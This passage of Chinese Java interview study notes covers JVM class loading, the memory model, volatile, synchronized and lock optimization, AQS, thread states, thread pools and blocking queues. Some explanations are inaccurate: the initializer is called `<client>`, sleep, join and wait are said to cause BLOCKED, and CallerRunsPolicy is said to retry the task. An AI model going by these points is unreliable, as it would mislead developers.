为类静态变量分配内存并设置零值，该阶段进行的内存分配仅包括类变量，不包括实例变量。如果变量被 final 修饰，编译时 Javac 会为变量生成 ConstantValue 属性，准备阶段虚拟机会将变量值设为代码值。

**解析**

将常量池内的符号引用替换为直接引用。

**符号引用**以一组符号描述引用目标，可以是任何形式的字面量，只要使用时能无歧义地定位目标即可。与虚拟机内存布局无关，引用目标不一定已经加载到虚拟机内存。

**直接引用**是可以直接指向目标的指针、相对偏移量或能间接定位到目标的句柄。和虚拟机的内存布局相关，引用目标必须已在虚拟机的内存中存在。

**初始化**

直到该阶段 JVM 才开始执行类中编写的代码。准备阶段时变量赋过零值，初始化阶段会根据程序员的编码去初始化类变量和其他资源。初始化阶段就是执行类构造方法中的 `<client>` 方法，该方法是 Javac 自动生成的。

### 有哪些类加载器？

自 JDK1.2 起 Java 一直保持三层类加载器：

- **启动类加载器**

  在 JVM 启动时创建，负责加载最核心的类，例如 Object、System 等。无法被程序直接引用，如果需要把加载委派给启动类加载器，直接使用 null 代替即可，因为启动类加载器通常由操作系统实现，并不存在于 JVM 体系。

- **平台类加载器**

  从 JDK9 开始从扩展类加载器更换为平台类加载器，负载加载一些扩展的系统类，比如 XML、加密、压缩相关的功能类等。

- **应用类加载器**

  也称系统类加载器，负责加载用户类路径上的类库，可以直接在代码中使用。如果没有自定义类加载器，一般情况下应用类加载器就是默认的类加载器。自定义类加载器通过继承 ClassLoader 并重写 `findClass` 方法实现。

### 双亲委派模型是什么？

类加载器具有等级制度但非继承关系，以组合的方式复用父加载器的功能。双亲委派模型要求除了顶层的启动类加载器外，其余类加载器都应该有自己的父加载器。

一个类加载器收到了类加载请求，它不会自己去尝试加载，而将该请求委派给父加载器，每层的类加载器都是如此，因此所有加载请求最终都应该传送到启动类加载器，只有当父加载器反馈无法完成请求时，子加载器才会尝试。

类跟随它的加载器一起具备了有优先级的层次关系，确保某个类在各个类加载器环境中都是同一个，保证程序的稳定性。

### 如何判断两个类是否相等？

任意一个类都必须由类加载器和这个类本身共同确立其在虚拟机中的唯一性。

两个类只有由同一类加载器加载才有比较意义，否则即使两个类来源于同一个 Class 文件，被同一个 JVM 加载，只要类加载器不同，这两个类就必定不相等。

## 并发

### 什么是指令重[排序](https://www.nowcoder.com/jump/super-jump/word?word=排序)？

为了提高性能，编译器和处理器通常会对指令进行重[排序]()，重[排序]()指从源代码到指令序列的重[排序]()，分为三种：① 编译器优化的重[排序]()，编译器在不改变单线程程序语义的前提下可以重排语句的执行顺序。② 指令级并行的重[排序]()，如果不存在数据依赖性，处理器可以改变语句对应机器指令的执行顺序。③ 内存系统的重[排序]()。

### 原子性、可见性、有序性分别是什么？

**原子性**

基本数据类型的访问都具备原子性，例外就是 long 和 double，虚拟机将没有被 volatile 修饰的 64 位数据操作划分为两次 32 位操作。

如果应用场景需要更大范围的原子性保证，JMM 还提供了 lock 和 unlock 操作满足需求，尽管 JVM 没有把这两种操作直接开放给用户使用，但是提供了更高层次的字节码指令 monitorenter 和 monitorexit，这两个字节码指令反映到 Java 代码中就是 synchronized。

**可见性**

可见性指当一个线程修改了共享变量时，其他线程能够立即得知修改。JMM 通过在变量修改后将值同步回主内存，在变量读取前从主内存刷新的方式实现可见性，无论普通变量还是 volatile 变量都是如此，区别是 volatile 保证新值能立即同步到主内存以及每次使用前立即从主内存刷新。

除了 volatile 外，synchronized 和 final 也可以保证可见性。同步块可见性由"对一个变量执行 unlock 前必须先把此变量同步回主内存，即先执行 store 和 write"这条规则获得。final 的可见性指：被 final 修饰的字段在构造方法中一旦初始化完成，并且构造方法没有把 this 引用传递出去，那么其他线程就能看到 final 字段的值。

**有序性**

有序性可以总结为：在本线程内观察所有操作是有序的，在一个线程内观察另一个线程，所有操作都是无序的。前半句指 as-if-serial 语义，后半句指指令重[排序]()和工作内存与主内存延迟现象。

Java 提供 volatile 和 synchronized 保证有序性，volatile 本身就包含禁止指令重[排序]()的语义，而 synchronized 保证一个变量在同一时刻只允许一条线程对其进行 lock 操作，确保持有同一个锁的两个同步块只能串行进入。

### 谈一谈 volatile

JMM 为 volatile 定义了一些特殊访问规则，当变量被定义为 volatile 后具备两种特性：

- **保证变量对所有线程可见**

  当一条线程修改了变量值，新值对于其他线程来说是立即可以得知的。volatile 变量在各个线程的工作内存中不存在一致性问题，但 Java 的运算操作符并非原子操作，导致 volatile 变量运算在并发下仍不安全。

- **禁止指令重[排序]()优化**

  使用 volatile 变量进行写操作，汇编指令带有 lock 前缀，相当于一个内存屏障，后面的指令不能重排到内存屏障之前。

  使用 lock 前缀引发两件事：① 将当前处理器缓存行的数据写回系统内存。②使其他处理器的缓存无效。相当于对缓存变量做了一次 store 和 write 操作，让 volatile 变量的修改对其他处理器立即可见。

**静态变量 i 执行多线程 i++ 的不安全问题**

自增语句由 4 条字节码指令构成的，依次为 `getstatic`、`iconst_1`、`iadd`、`putstatic`，当 `getstatic` 把 i 的值取到操作栈顶时，volatile 保证了 i 值在此刻正确，但在执行 `iconst_1`、`iadd` 时，其他线程可能已经改变了 i 值，操作栈顶的值就变成了过期数据，所以 `putstatic` 执行后就可能把较小的 i 值同步回了主内存。 

**适用场景**

① 运算结果并不依赖变量的当前值。② 一写多读，只有单一的线程修改变量值。

**内存语义**

写一个 volatile 变量时，把该线程工作内存中的值刷新到主内存。

读一个 volatile 变量时，把该线程工作内存值置为无效，从主内存读取。

**指令重[排序]()特点**

第二个操作是 volatile 写，不管第一个操作是什么都不能重[排序]()，确保写之前的操作不会被重[排序]()到写之后。

第一个操作是 volatile 读，不管第二个操作是什么都不能重[排序]()，确保读之后的操作不会被重[排序]()到读之前。

第一个操作是 volatile 写，第二个操作是 volatile 读不能重[排序]()。

**JSR-133 增强 volatile 语义的原因**

在旧的内存模型中，虽然不允许 volatile 变量间重[排序]()，但允许 volatile 变量与普通变量重[排序]()，可能导致内存不可见问题。JSR-133 严格限制编译器和处理器对 volatile 变量与普通变量的重[排序]()，确保 volatile 的写-读和锁的释放-获取具有相同的内存语义。

### final 可以保证可见性吗？

final 可以保证可见性，被 final 修饰的字段在构造方法中一旦被初始化完成，并且构造方法没有把 this 引用传递出去，在其他线程中就能看见 final 字段值。

在旧的 JMM 中，一个严重缺陷是线程可能看到 final 值改变。比如一个线程看到一个 int 类型 final 值为 0，此时该值是未初始化前的零值，一段时间后该值被某线程初始化，再去读这个 final 值会发现值变为 1。

为修复该漏洞，JSR-133 为 final 域增加重[排序]()规则：只要对象是正确构造的（被构造对象的引用在构造方法中没有逸出），那么不需要使用同步就可以保证任意线程都能看到这个 final 域初始化后的值。

**写 final 域重[排序]()规则**

禁止把 final 域的写重[排序]()到构造方法之外，编译器会在 final 域的写后，构造方法的 return 前，插入一个 Store Store 屏障。确保在对象引用为任意线程可见之前，对象的 final 域已经初始化过。

**读 final 域重[排序]()规则**

在一个线程中，初次读对象引用和初次读该对象包含的 final 域，JMM 禁止处理器重[排序]()这两个操作。编译器在读 final 域操作的前面插入一个 Load Load 屏障，确保在读一个对象的 final 域前一定会先读包含这个 final 域的对象引用。

### 谈一谈 synchronized

每个 Java 对象都有一个关联的 monitor，使用 synchronized 时 JVM 会根据使用环境找到对象的 monitor，根据 monitor 的状态进行加解锁的判断。如果成功加锁就成为该 monitor 的唯一持有者，monitor 在被释放前不能再被其他线程获取。

同步代码块使用 monitorenter 和 monitorexit 这两个字节码指令获取和释放 monitor。这两个字节码指令都需要一个引用类型的参数指明要锁定和解锁的对象，对于同步普通方法，锁是当前实例对象；对于静态同步方法，锁是当前类的 Class 对象；对于同步方法块，锁是 synchronized 括号里的对象。

执行 monitorenter 指令时，首先尝试获取对象锁。如果这个对象没有被锁定，或当前线程已经持有锁，就把锁的计数器加 1，执行 monitorexit 指令时会将锁计数器减 1。一旦计数器为 0 锁随即就被释放。

例如有两个线程 A、B 竞争 monitor，当 A 竞争到锁时会将 monitor 中的 owner 设置为 A，把 B 阻塞并放到等待资源的 ContentionList 队列。ContentionList 中的部分线程会进入 EntryList，EntryList 中的线程会被指定为 OnDeck 竞争候选者，如果获得了锁资源将进入 Owner 状态，释放锁后进入 !Owner 状态。被阻塞的线程会进入 WaitSet。

被 synchronized 修饰的同步块对一条线程来说是可重入的，并且同步块在持有锁的线程释放锁前会阻塞其他线程进入。从执行成本的角度看，持有锁是一个重量级的操作。Java 线程是映射到操作系统的内核线程上的，如果要阻塞或唤醒一条线程，需要操作系统帮忙完成，不可避免用户态到核心态的转换。

**不公平的原因**

所有收到锁请求的线程首先自旋，如果通过自旋也没有获取锁将被放入 ContentionList，该做法对于已经进入队列的线程不公平。

为了防止 ContentionList 尾部的元素被大量线程进行 CAS 访问影响性能，Owner 线程会在释放锁时将 ContentionList 的部分线程移动到 EntryList 并指定某个线程为 OnDeck 线程，该行为叫做竞争切换，牺牲了公平性但提高了性能。

### 锁优化有哪些策略？

JDK 6 对 synchronized 做了很多优化，引入了自适应自旋、锁消除、锁粗化、偏向锁和轻量级锁等提高锁的效率，锁一共有 4 个状态，级别从低到高依次是：无锁、偏向锁、轻量级锁和重量级锁，状态会随竞争情况升级。锁可以升级但不能降级，这种只能升级不能降级的锁策略是为了提高锁获得和释放的效率。

### 自旋锁是什么？

同步对性能最大的影响是阻塞，挂起和恢复线程的操作都需要转入内核态完成。许多应用上共享数据的锁定只会持续很短的时间，为了这段时间去挂起和恢复线程并不值得。如果机器有多个处理器核心，我们可以让后面请求锁的线程稍等一会，但不放弃处理器的执行时间，看看持有锁的线程是否很快会释放锁。为了让线程等待只需让线程执行一个忙循环，这项技术就是自旋锁。

自旋锁在 JDK1.4 就已引入，默认关闭，在 JDK6 中改为默认开启。自旋不能代替阻塞，虽然避免了线程切换开销，但要占用处理器时间，如果锁被占用的时间很短，自旋的效果就会非常好，反之只会白白消耗处理器资源。如果自旋超过了限定的次数仍然没有成功获得锁，就应挂起线程，自旋默认限定次数是 10。

### 什么是自适应自旋？

JDK6 对自旋锁进行了优化，自旋时间不再固定，而是由前一次的自旋时间及锁拥有者的状态决定。

如果在同一个锁上，自旋刚刚成功获得过锁且持有锁的线程正在运行，虚拟机会认为这次自旋也很可能成功，进而允许自旋持续更久。如果自旋很少成功，以后获取锁时将可能直接省略掉自旋，避免浪费处理器资源。

有了自适应自旋，随着程序运行时间的增长，虚拟机对程序锁的状况预测就会越来越精准。

### 锁消除是什么？

锁消除指即时编译器对检测到不可能存在共享数据竞争的锁进行消除。

主要判定依据来源于逃逸分析，如果判断一段代码中堆上的所有数据都只被一个线程访问，就可以当作栈上的数据对待，认为它们是线程私有的而无须同步。

### 锁粗化是什么？

原则需要将同步块的作用范围限制得尽量小，只在共享数据的实际作用域中进行同步，这是为了使等待锁的线程尽快拿到锁。

但如果一系列的连续操作都对同一个对象反复加锁和解锁，甚至加锁操作是出现在循环体之外的，即使没有线程竞争也会导致不必要的性能消耗。因此如果虚拟机探测到有一串零碎的操作都对同一个对象加锁，将会把同步的范围扩展到整个操作序列的外部。

### 偏向锁是什么？

偏向锁是为了在没有竞争的情况下减少锁开销，锁会偏向于第一个获得它的线程，如果在执行过程中锁一直没有被其他线程获取，则持有偏向锁的线程将不需要进行同步。

当锁对象第一次被线程获取时，虚拟机会将对象头中的偏向模式设为 1，同时使用 CAS 把获取到锁的线程 ID 记录在对象的 Mark Word 中。如果 CAS 成功，持有偏向锁的线程以后每次进入锁相关的同步块都不再进行任何同步操作。

一旦有其他线程尝试获取锁，偏向模式立即结束，根据锁对象是否处于锁定状态决定是否撤销偏向，后续同步按照轻量级锁那样执行。

### 轻量级锁是什么？

轻量级锁是为了在没有竞争的前提下减少重量级锁使用操作系统互斥量产生的性能消耗。

在代码即将进入同步块时，如果同步对象没有被锁定，虚拟机将在当前线程的栈帧中建立一个锁记录空间，存储锁对象目前 Mark Word 的拷贝。然后虚拟机使用 CAS 尝试把对象的 Mark Word 更新为指向锁记录的指针，如果更新成功即代表该线程拥有了锁，锁标志位将转变为 00，表示处于轻量级锁定状态。

如果更新失败就意味着至少存在一条线程与当前线程竞争。虚拟机检查对象的 Mark Word 是否指向当前线程的栈帧，如果是则说明当前线程已经拥有了锁，直接进入同步块继续执行，否则说明锁对象已经被其他线程抢占。如果出现两条以上线程争用同一个锁，轻量级锁就不再有效，将膨胀为重量级锁，锁标志状态变为 10，此时Mark Word 存储的就是指向重量级锁的指针，后面等待锁的线程也必须阻塞。

解锁同样通过 CAS 进行，如果对象 Mark Word 仍然指向线程的锁记录，就用 CAS 把对象当前的 Mark Word 和线程复制的 Mark Word 替换回来。假如替换成功同步过程就顺利完成了，如果失败则说明有其他线程尝试过获取该锁，就要在释放锁的同时唤醒被挂起的线程。

### 偏向锁、轻量级锁和重量级锁的区别

偏向锁的优点是加解锁不需要额外消耗，和执行非同步方法比仅存在纳秒级差距，缺点是如果存在锁竞争会带来额外锁撤销的消耗，适用只有一个线程访问同步代码块的场景。

轻量级锁的优点是竞争线程不阻塞，程序响应速度快，缺点是如果线程始终得不到锁会自旋消耗 CPU，适用追求响应时间、同步代码块执行快的场景。

重量级锁的优点是线程竞争不使用自旋不消耗CPU，缺点是线程会阻塞，响应时间慢，适应追求吞吐量、同步代码块执行慢的场景。

### Lock 和 synchronized 有什么区别?

Lock 接是 juc 包的顶层接口，基于Lock 接口，用户能够以非块结构来实现互斥同步，摆脱了语言特性束缚，在类库层面实现同步。Lock 并未用到 synchronized，而是利用了 volatile 的可见性。

重入锁 ReentrantLock 是 Lock 最常见的实现，与 synchronized 一样可重入，不过它增加了一些高级功能：

- **等待可中断： **持有锁的线程长期不释放锁时，正在等待的线程可以选择放弃等待而处理其他事情。 
- **公平锁：** 公平锁指多个线程在等待同一个锁时，必须按照申请锁的顺序来依次获得锁，而非公平锁不保证这一点，在锁被释放时，任何线程都有机会获得锁。synchronized 是非公平的，ReentrantLock 在默认情况下是非公平的，可以通过构造方法指定公平锁。一旦使用了公平锁，性能会急剧下降，影响吞吐量。 
- **锁绑定多个条件：** 一个 ReentrantLock 可以同时绑定多个 Condition。synchronized 中锁对象的 `wait` 跟 `notify` 可以实现一个隐含条件，如果要和多个条件关联就不得不额外添加锁，而 ReentrantLock 可以多次调用 `newCondition` 创建多个条件。 

一般优先考虑使用 synchronized：① synchronized 是语法层面的同步，足够简单。② Lock 必须确保在 finally 中释放锁，否则一旦抛出异常有可能永远不会释放锁。使用 synchronized 可以由 JVM 来确保即使出现异常锁也能正常释放。③ 尽管 JDK5 时 ReentrantLock 的性能优于 synchronized，但在 JDK6 进行锁优化后二者的性能基本持平。从长远来看 JVM 更容易针对synchronized 优化，因为 JVM 可以在线程和对象的元数据中记录 synchronized 中锁的相关信息，而使用 Lock 的话 JVM 很难得知具体哪些锁对象是由特定线程持有的。

### ReentrantLock 的可重入是怎么实现的？

以非公平锁为例，通过 `nonfairTryAcquire` 方法获取锁，该方法增加了再次获取同步状态的处理逻辑：判断当前线程是否为获取锁的线程来决定获取是否成功，如果是获取锁的线程再次请求则将同步状态值增加并返回 true，表示获取同步状态成功。

成功获取锁的线程再次获取锁将增加同步状态值，释放同步状态时将减少同步状态值。如果锁被获取了 n 次，那么前 n-1 次 `tryRelease` 方法必须都返回 fasle，只有同步状态完全释放才能返回 true，该方法将同步状态是否为 0 作为最终释放条件，释放时将占有线程设置为null 并返回 true。

对于非公平锁只要 CAS 设置同步状态成功则表示当前线程获取了锁，而公平锁则不同。公平锁使用 `tryAcquire` 方法，该方法与`nonfairTryAcquire` 的唯一区别就是判断条件中多了对同步队列中当前节点是否有前驱节点的判断，如果该方法返回 true 表示有线程比当前线程更早请求锁，因此需要等待前驱线程获取并释放锁后才能获取锁。

### 什么是读写锁？

ReentrantLock 是排他锁，同一时刻只允许一个线程访问，读写锁在同一时刻允许多个读线程访问，在写线程访问时，所有的读写线程均阻塞。读写锁维护了一个读锁和一个写锁，通过分离读写锁使并发性相比排他锁有了很大提升。

读写锁依赖 AQS 来实现同步功能，读写状态就是其同步器的同步状态。读写锁的自定义同步器需要在同步状态，即一个 int 变量上维护多个读线程和一个写线程的状态。读写锁将变量切分成了两个部分，高 16 位表示读，低 16 位表示写。

写锁是可重入排他锁，如果当前线程已经获得了写锁则增加写状态，如果当前线程在获取写锁时，读锁已经被获取或者该线程不是已经获得写锁的线程则进入等待。写锁的释放与 ReentrantLock 的释放类似，每次释放减少写状态，当写状态为 0 时表示写锁已被释放。

读锁是可重入共享锁，能够被多个线程同时获取，在没有其他写线程访问时，读锁总会被成功获取。如果当前线程已经获取了读锁，则增加读状态。如果当前线程在获取读锁时，写锁已被其他线程获取则进入等待。读锁每次释放会减少读状态，减少的值是（1<<16），读锁的释放是线程安全的。

**锁降级**指把持住当前拥有的写锁，再获取读锁，随后释放先前拥有的写锁。

锁降级中读锁的获取是必要的，这是为了保证数据可见性，如果当前线程不获取读锁而直接释放写锁，假设此刻另一个线程 A 获取写锁修改了数据，当前线程无法感知线程 A 的数据更新。如果当前线程获取读锁，遵循锁降级的步骤，A 将被阻塞，直到当前线程使用数据并释放读锁之后，线程 A 才能获取写锁进行数据更新。

### AQS 了解吗？

AQS 队列同步器是用来构建锁或其他同步组件的基础框架，它使用一个 volatile int state 变量作为共享资源，如果线程获取资源失败，则进入同步队列等待；如果获取成功就执行临界区代码，释放资源时会通知同步队列中的等待线程。

同步器的主要使用方式是继承，子类通过继承同步器并实现它的抽象方法来管理同步状态，对同步状态进行更改需要使用同步器提供的 3个方法 `getState`、`setState` 和 `compareAndSetState` ，它们保证状态改变是安全的。子类推荐被定义为自定义同步组件的静态内部类，同步器自身没有实现任何同步接口，它仅仅定义若干同步状态获取和释放的方法，同步器既支持独占式也支持共享式。

同步器是实现锁的关键，在锁的实现中聚合同步器，利用同步器实现锁的语义。锁面向使用者，定义了使用者与锁交互的接口，隐藏实现细节；同步器面向锁的实现者，简化了锁的实现方式，屏蔽了同步状态管理、线程排队、等待与唤醒等底层操作。

每当有新线程请求资源时都会进入一个等待队列，只有当持有锁的线程释放锁资源后该线程才能持有资源。等待队列通过双向[链表]()实现，线程被封装在[链表]()的 Node 节点中，Node 的等待状态包括：CANCELLED（线程已取消）、SIGNAL（线程需要唤醒）、CONDITION （线程正在等待）、PROPAGATE（后继节点会传播唤醒操作，只在共享模式下起作用）。

### AQS 有哪两种模式？

**独占模式**表示锁只会被一个线程占用，其他线程必须等到持有锁的线程释放锁后才能获取锁，同一时间只能有一个线程获取到锁。

**共享模式**表示多个线程获取同一个锁有可能成功，ReadLock 就采用共享模式。

独占模式通过 acquire 和 release 方法获取和释放锁，共享模式通过 acquireShared 和 releaseShared 方法获取和释放锁。

### AQS 独占式获取/释放锁的原理？

获取同步状态时，调用 `acquire` 方法，维护一个同步队列，使用 `tryAcquire` 方法安全地获取线程同步状态，获取失败的线程会被构造同步节点并通过 `addWaiter` 方法加入到同步队列的尾部，在队列中自旋。之后调用 `acquireQueued` 方法使得该节点以死循环的方式获取同步状态，如果获取不到则阻塞，被阻塞线程的唤醒主要依靠前驱节点的出队或被中断实现，移出队列或停止自旋的条件是前驱节点是头结点且成功获取了同步状态。

释放同步状态时，同步器调用 `tryRelease` 方法释放同步状态，然后调用 `unparkSuccessor` 方法唤醒头节点的后继节点，使后继节点重新尝试获取同步状态。

### AQS 共享式式获取/释放锁的原理？

获取同步状态时，调用 `acquireShared` 方法，该方法调用 `tryAcquireShared` 方法尝试获取同步状态，返回值为 int 类型，返回值不小于于 0 表示能获取同步状态。因此在共享式获取锁的自旋过程中，成功获取同步状态并退出自旋的条件就是该方法的返回值不小于0。

释放同步状态时，调用 `releaseShared` 方法，释放后会唤醒后续处于等待状态的节点。它和独占式的区别在于 `tryReleaseShared` 方法必须确保同步状态安全释放，通过循环 CAS 保证，因为释放同步状态的操作会同时来自多个线程。

### 线程的生命周期有哪些状态？

NEW：新建状态，线程被创建且未启动，此时还未调用 `start` 方法。

RUNNABLE：Java 将操作系统中的就绪和运行两种状态统称为 RUNNABLE，此时线程有可能在等待时间片，也有可能在执行。

BLOCKED：阻塞状态，可能由于锁被其他线程占用、调用了 `sleep` 或 `join` 方法、执行了 `wait`方法等。

WAITING：等待状态，该状态线程不会被分配 CPU 时间片，需要其他线程通知或中断。可能由于调用了无参的 `wait` 和 `join` 方法。

TIME_WAITING：限期等待状态，可以在指定时间内自行返回。导可能由于调用了带参的 `wait` 和 `join` 方法。

TERMINATED：终止状态，表示当前线程已执行完毕或异常退出。

### 线程的创建方式有哪些？

① 继承 Thread 类并重写 run 方法。实现简单，但不符合里氏替换原则，不可以继承其他类。

② 实现 Runnable 接口并重写 run 方法。避免了单继承局限性，编程更加灵活，实现解耦。

③实现 Callable 接口并重写 call 方法。可以获取线程执行结果的返回值，并且可以抛出异常。

### 线程有哪些方法？

① `sleep` 方***导致当前线程进入休眠状态，与 `wait` 不同的是该方法不会释放锁资源，进入的是 TIMED-WAITING 状态。

② `yiled` 方法使当前线程让出 CPU 时间片给优先级相同或更高的线程，回到 RUNNABLE 状态，与其他线程一起重新竞争CPU时间片。

③ `join` 方法用于等待其他线程运行终止，如果当前线程调用了另一个线程的 join 方法，则当前线程进入阻塞状态，当另一个线程结束时当前线程才能从阻塞状态转为就绪态，等待获取CPU时间片。底层使用的是wait，也会释放锁。

### 什么是守护线程？

守护线程是一种支持型线程，可以通过 `setDaemon(true)` 将线程设置为守护线程，但必须在线程启动前设置。

守护线程被用于完成支持性工作，但在 JVM 退出时守护线程中的 finally 块不一定执行，因为 JVM 中没有非守护线程时需要立即退出，所有守护线程都将立即终止，不能靠在守护线程使用 finally 确保关闭资源。

### 线程通信的方式有哪些？

命令式编程中线程的通信机制有两种，共享内存和消息传递。在共享内存的并发模型里线程间共享程序的公共状态，通过写-读内存中的公共状态进行隐式通信。在消息传递的并发模型里线程间没有公共状态，必须通过发送消息来显式通信。Java 并发采用共享内存模型，线程之间的通信总是隐式进行，整个通信过程对程序员完全透明。

**volatile** 告知程序任何对变量的读需要从主内存中获取，写必须同步刷新回主内存，保证所有线程对变量访问的可见性。

**synchronized** 确保多个线程在同一时刻只能有一个处于方法或同步块中，保证线程对变量访问的原子性、可见性和有序性。

**等待通知机制**指一个线程 A 调用了对象的 `wait` 方法进入等待状态，另一线程 B 调用了对象的 `notify/notifyAll` 方法，线程 A 收到通知后结束阻塞并执行后序操作。对象上的 `wait` 和 `notify/notifyAll` 如同开关信号，完成等待方和通知方的交互。

如果一个线程执行了某个线程的 `join` 方法，这个线程就会阻塞等待执行了 `join` 方法的线程终止，这里涉及等待/通知机制。`join` 底层通过 `wait` 实现，线程终止时会调用自身的 `notifyAll` 方法，通知所有等待在该线程对象上的线程。

**管道 IO 流**用于线程间数据传输，媒介为内存。PipedOutputStream 和 PipedWriter 是输出流，相当于生产者，PipedInputStream 和 PipedReader 是输入流，相当于消费者。管道流使用一个默认大小为 1KB 的循环缓冲数组。输入流从缓冲数组读数据，输出流往缓冲数组中写数据。当数组已满时，输出流所在线程阻塞；当数组首次为空时，输入流所在线程阻塞。

**ThreadLocal** 是线程共享变量，但它可以为每个线程创建单独的副本，副本值是线程私有的，互相之间不影响。

### 线程池有什么好处？

降低资源消耗，复用已创建的线程，降低开销、控制最大并发数。

隔离线程环境，可以配置独立线程池，将较慢的线程与较快的隔离开，避免相互影响。

实现任务线程队列缓冲策略和拒绝机制。

实现某些与时间相关的功能，如定时执行、周期执行等。

### 线程池处理任务的流程？

① 核心线程池未满，创建一个新的线程执行任务，此时 workCount < corePoolSize。

② 如果核心线程池已满，工作队列未满，将线程存储在工作队列，此时 workCount >= corePoolSize。

③ 如果工作队列已满，线程数小于最大线程数就创建一个新线程处理任务，此时 workCount < maximumPoolSize，这一步也需要获取全局锁。

④ 如果超过大小线程数，按照拒绝策略来处理任务，此时 workCount > maximumPoolSize。

线程池创建线程时，会将线程封装成工作线程 Worker，Worker 在执行完任务后还会循环获取工作队列中的任务来执行。

### 有哪些创建线程池的方法?

可以通过 Executors 的静态工厂方法创建线程池：

① `newFixedThreadPool`，固定大小的线程池，核心线程数也是最大线程数，不存在空闲线程，[keep]()AliveTime = 0。该线程池使用的工作队列是无界阻塞队列 LinkedBlockingQueue，适用于负载较重的服务器。

② `newSingleThreadExecutor`，使用单线程，相当于单线程串行执行所有任务，适用于需要保证顺序执行任务的场景。

③ `newCachedThreadPool`，maximumPoolSize 设置为 Integer 最大值，是高度可伸缩的线程池。该线程池使用的工作队列是没有容量的 SynchronousQueue，如果主线程提交任务的速度高于线程处理的速度，线程池会不断创建新线程，极端情况下会创建过多线程而耗尽CPU 和内存资源。适用于执行很多短期异步任务的小程序或负载较轻的服务器。

④ `newScheduledThreadPool`：线程数最大为 Integer 最大值，存在 OOM 风险。支持定期及周期性任务执行，适用需要多个后台线程执行周期任务，同时需要限制线程数量的场景。相比 Timer 更安全，功能更强，与 `newCachedThreadPool` 的区别是不回收工作线程。

⑤ `newWorkStealingPool`：JDK8 引入，创建持有足够线程的线程池支持给定的并行度，通过多个队列减少竞争。

### 创建线程池有哪些参数？

① corePoolSize：常驻核心线程数，如果为 0，当执行完任务没有任何请求时会消耗线程池；如果大于 0，即使本地任务执行完，核心线程也不会被销毁。该值设置过大会浪费资源，过小会导致线程的频繁创建与销毁。

② maximumPoolSize：线程池能够容纳同时执行的线程[最大数]()，必须大于等于 1，如果与核心线程数设置相同代表固定大小线程池。

③ [keep]()AliveTime：线程空闲时间，线程空闲时间达到该值后会被销毁，直到只剩下 corePoolSize 个线程为止，避免浪费内存资源。

④ unit：[keep]()AliveTime 的时间单位。

⑤ workQueue：工作队列，当线程请求数大于等于 corePoolSize 时线程会进入阻塞队列。

⑥ threadFactory：线程工厂，用来生产一组相同任务的线程。可以给线程命名，有利于分析错误。

⑦ handler：拒绝策略，默认使用 AbortPolicy 丢弃任务并抛出异常，CallerRunsPolicy 表示重新尝试提交该任务，DiscardOldestPolicy 表示抛弃队列里等待最久的任务并把当前任务加入队列，DiscardPolicy 表示直接抛弃当前任务但不抛出异常。

### 如何关闭线程池？

可以调用 `shutdown` 或 `shutdownNow` 方法关闭线程池，原理是遍历线程池中的工作线程，然后逐个调用线程的 `interrupt` 方法中断线程，无法响应中断的任务可能永远无法终止。

区别是 `shutdownNow` 首先将线程池的状态设为 STOP，然后尝试停止正在执行或暂停任务的线程，并返回等待执行任务的列表。而 `shutdown` 只是将线程池的状态设为 SHUTDOWN，然后中断没有正在执行任务的线程。

通常调用 `shutdown` 来关闭线程池，如果任务不一定要执行完可调用 `shutdownNow`。

### 线程池的选择策略有什么？

可以从以下角度分析：①任务性质：CPU 密集型、IO 密集型和混合型。②任务优先级。③任务执行时间。④任务依赖性：是否依赖其他资源，如数据库连接。

性质不同的任务可用不同规模的线程池处理，CPU 密集型任务应配置尽可能小的线程，如配置 N~~cpu~~+1 个线程的线程池。由于 IO 密集型任务线程并不是一直在执行任务，应配置尽可能多的线程，如 2*N~~cpu~~。混合型的任务，如果可以拆分，将其拆分为一个 CPU 密集型任务和一个 IO 密集型任务，只要两个任务执行的时间相差不大那么分解后的吞吐量将高于串行执行的吞吐量，如果相差太大则没必要分解。

优先级不同的任务可以使用优先级队列 PriorityBlockingQueue 处理。

执行时间不同的任务可以交给不同规模的线程池处理，或者使用优先级队列让执行时间短的任务先执行。

依赖数据库连接池的任务，由于线程提交 SQL 后需要等待数据库返回的结果，等待的时间越长 CPU 空闲的时间就越长，因此线程数应该尽可能地设置大一些，提高 CPU 的利用率。

建议使用有界队列，能增加系统的稳定性和预警能力，可以根据需要设置的稍微大一些。

### 阻塞队列有哪些选择?

阻塞队列支持阻塞插入和移除，当队列满时，阻塞插入元素的线程直到队列不满。当队列为空时，获取元素的线程会被阻塞直到队列非空。阻塞队列常用于生产者和消费者的场景，阻塞队列就是生产者用来存放元素，消费者用来获取元素的容器。

**Java 中的阻塞队列**

ArrayBlockingQueue，由数组组成的有界阻塞队列，默认情况下不保证线程公平，有可能先阻塞的线程最后才访问队列。

LinkedBlockingQueue，由[链表]()结构组成的有界阻塞队列，队列的默认和最大长度为 Integer 最大值。

PriorityBlockingQueue，支持优先级的无界阻塞队列，默认情况下元素按照升序[排序]()。可自定义 `compareTo` 方法指定[排序]()规则，或者初始化时指定 Comparator [排序]()，不能保证同优先级元素的顺序。

DelayQueue，支持延时获取元素的无界阻塞队列，使用优先级队列实现。创建元素时可以指定多久才能从队列中获取当前元素，只有延迟期满时才能从队列中获取元素，适用于缓存和定时调度。

SynchronousQueue，不存储元素的阻塞队列，每一个 put 必须等待一个 take。默认使用非公平策略，也支持公平策略，适用于传递性场景，吞吐量高。

LinkedTransferQueue，[链表]()组成的无界阻塞队列，相对于其他阻塞队列多了 `tryTransfer` 和 `transfer` 方法。`transfer`方法：如果当前有消费者正等待接收元素，可以把生产者传入的元素立刻传输给消费者，否则会将元素放在队列的尾节点并等到该元素被消费者消费才返回。`tryTransfer` 方法用来试探生产者传入的元素能否直接传给消费者，如果没有消费者等待接收元素则返回 false，和 `transfer` 的区别是无论消费者是否消费都会立即返回。

LinkedBlockingDeque，[链表]()组成的双向阻塞队列，可从队列的两端插入和移出元素，多线程同时入队时减少了竞争。

**实现原理**

使用通知模式实现，生产者往满的队列里添加元素时会阻塞，当消费者消费后，会通知生产者当前队列可用。当往队列里插入一个元素，如果队列不可用，阻塞生产者主要通过 LockSupport 的 `park` 方法实现，不同操作系统中实现方式不同，在 Linux 下使用的是系统方法 `pthread_cond_wait` 实现。

### 谈一谈 ThreadLocal

ThreadLoacl 是线程共享变量，主要用于一个线程内跨类、方法传递数据。ThreadLoacl 有一个静态内部类 ThreadLocalMap，其 Key 是 ThreadLocal 对象，值是 Entry 对象，Entry 中只有一个 Object 类的 vaule 值。ThreadLocal 是线程共享的，但 ThreadLocalMap 是每个线程私有的。ThreadLocal 主要有 set、get 和 remove 三个方法。

